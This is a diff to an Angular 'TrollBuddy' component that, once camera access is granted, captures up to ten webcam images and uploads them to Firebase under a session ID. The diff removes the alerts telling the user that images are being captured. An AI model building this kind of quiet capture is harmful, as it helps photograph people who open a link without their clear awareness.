@@ -4,7 +4,7 @@ import { NotificationService } from '../../services/notification';
 import { MatButtonModule } from '@angular/material/button';
 import { MatCardModule } from '@angular/material/card';
 import { Button } from '../ui/components/ui/button/button';
-import { ActivatedRoute } from '@angular/router'; // Import ActivatedRoute
+import { ActivatedRoute, Router } from '@angular/router'; // Import ActivatedRoute
 import { environment } from '../../environments/environment'; // Import environment
 import { getDatabase, ref, get, set, remove } from '@angular/fire/database';
 
@@ -16,9 +16,11 @@ import { getDatabase, ref, get, set, remove } from '@angular/fire/database';
   standalone: true
 })
 export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
+
   private readonly notificationService = inject(NotificationService);
   private readonly route = inject(ActivatedRoute); // Inject ActivatedRoute
   private readonly sanitizer = inject(DomSanitizer);
+    private readonly router = inject(Router);
 
   @ViewChild('videoElement', { static: true }) videoElement!: ElementRef<HTMLVideoElement>;
   @ViewChild('canvasElement', { static: true }) canvasElement!: ElementRef<HTMLCanvasElement>;
@@ -78,6 +80,10 @@ export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
     }
   }
 
+  routeToRegistration() {
+    this.router.navigate(['/registration']);
+  }
+
   private async loadExistingImages() {
     if (!this.sessionId) return;
     const db = getDatabase();
@@ -121,12 +127,9 @@ export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
           this.cameraGranted.set(true);
           this.startCapturing();
         });
-      } else {
-        alert('Video element not found');
-      }
+      } 
     } catch (error) {
       console.error('Error accessing camera:', error);
-      alert('Error accessing camera: ' + (error as Error).message);
       this.notificationService.showError('Zugriff verweigert oder nicht unterstützt.');
       this.cameraGranted.set(false);
     }
@@ -137,7 +140,6 @@ export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
     this.intervalId = setInterval(() => {
       if (this.capturedImages().length >= 10) {
         this.stopCamera();
-        alert('Captured 10 images. Camera stopped.');
         return;
       }
       this.captureImage();
@@ -166,7 +168,6 @@ export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
       }
       this.capturedImages.set(currentImages);
       console.log('Image captured and added to array, total images:', this.capturedImages().length);
-      alert('Image captured! Total images: ' + this.capturedImages().length);
 
       // Save to Firebase Realtime Database
       const db = getDatabase();
